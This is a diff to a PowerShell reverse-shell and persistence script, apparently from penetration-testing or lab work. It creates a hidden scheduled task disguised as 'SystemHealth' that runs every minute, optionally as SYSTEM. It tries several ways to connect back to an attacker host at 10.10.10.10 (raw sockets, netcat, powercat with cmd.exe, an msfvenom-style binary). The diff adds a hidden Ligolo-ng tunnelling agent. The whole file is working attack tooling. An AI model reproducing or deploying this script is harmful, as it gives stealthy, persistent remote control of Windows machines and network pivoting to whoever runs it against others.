@@ -6,10 +6,10 @@
 #
 # SETUP - create scheduled task (run from cmd.exe or PowerShell as current user):
 #
-#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /f
+#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /f
 #
 # To run as SYSTEM (requires elevated shell):
-#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
+#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
 #
 # To delete the task during cleanup:
 #   schtasks /delete /tn "SystemHealth" /f
@@ -20,6 +20,17 @@
 # ==============================================================================
 $LHOST = "10.10.10.10"
 $LPORT = 4444
+$WORKDIR = "C:\Temp"
+$LIGOLO_PORT = 11601
+$LIGOLO_PORT_FALLBACK = 443
+
+# ==============================================================================
+# WORKING DIRECTORY
+# All binary lookups resolve from here
+# ==============================================================================
+if (Test-Path $WORKDIR) {
+    Set-Location $WORKDIR
+}
 
 # ==============================================================================
 # CHECK FOR EXISTING CONNECTION
@@ -64,8 +75,7 @@ function Try-PSSocket {
     }
 }
 
-# Method 2: PowerShell one-liner style (alternative socket approach using StreamReader/Writer)
-# More stable on some targets where the byte-array method above has issues
+# Method 2: PowerShell StreamReader/Writer (more stable on some targets)
 function Try-PSSocket2 {
     try {
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
@@ -93,8 +103,8 @@ function Try-PSSocket2 {
 # Method 3: Netcat (if nc.exe has been uploaded or exists on target)
 function Try-Netcat {
     $ncPaths = @(
-        "C:\windows\temp\nc.exe",
-        "C:\temp\nc.exe",
+        "$WORKDIR\nc.exe",
+        "C:\Windows\Temp\nc.exe",
         "C:\nc.exe",
         "C:\ProgramData\nc.exe"
     )
@@ -118,10 +128,9 @@ function Try-PowerCat {
             powercat -c $LHOST -p $LPORT -e cmd.exe
             exit 0
         }
-        # Also check common upload paths
         $pcPaths = @(
-            "C:\windows\temp\powercat.ps1",
-            "C:\temp\powercat.ps1"
+            "$WORKDIR\powercat.ps1",
+            "C:\Windows\Temp\powercat.ps1"
         )
         foreach ($pcPath in $pcPaths) {
             if (Test-Path $pcPath) {
@@ -138,8 +147,8 @@ function Try-PowerCat {
 # Method 5: Custom shell binary (msfvenom payload or similar)
 function Try-ShellBinary {
     $shellPaths = @(
-        "C:\windows\temp\shell.exe",
-        "C:\temp\shell.exe",
+        "$WORKDIR\shell.exe",
+        "C:\Windows\Temp\shell.exe",
         "C:\ProgramData\shell.exe"
     )
     foreach ($shellPath in $shellPaths) {
@@ -155,6 +164,41 @@ function Try-ShellBinary {
     return $false
 }
 
+# Method 6: Ligolo-ng agent
+# Tries default ligolo port (11601) first, falls back to 443.
+# Runs agent.exe from WORKDIR as a detached background process.
+# Does NOT exit 0 on success - agent runs independently, script exits cleanly.
+function Try-Ligolo {
+    $agentPath = "$WORKDIR\agent.exe"
+    if (-not (Test-Path $agentPath)) { return }
+
+    # Check if agent is already running - avoid stacking processes
+    $running = Get-Process -Name "agent" -ErrorAction SilentlyContinue
+    if ($running) { return }
+
+    # Test reachability on primary port, then fallback
+    $portsToTry = @($LIGOLO_PORT, $LIGOLO_PORT_FALLBACK)
+    foreach ($port in $portsToTry) {
+        try {
+            $tcp = New-Object System.Net.Sockets.TcpClient
+            $connect = $tcp.BeginConnect($LHOST, $port, $null, $null)
+            $wait = $connect.AsyncWaitHandle.WaitOne(2000, $false)
+            if ($wait -and $tcp.Connected) {
+                $tcp.Close()
+                # Port is reachable - launch agent detached
+                Start-Process -FilePath $agentPath `
+                    -ArgumentList "-connect ${LHOST}:${port} -ignore-cert" `
+                    -WindowStyle Hidden `
+                    -PassThru | Out-Null
+                return
+            }
+            $tcp.Close()
+        } catch {
+            continue
+        }
+    }
+}
+
 # ==============================================================================
 # MAIN EXECUTION
 # ==============================================================================
@@ -163,6 +207,7 @@ Try-PSSocket2
 Try-Netcat
 Try-PowerCat
 Try-ShellBinary
+Try-Ligolo
 
 # All methods failed - exit cleanly
 exit 0
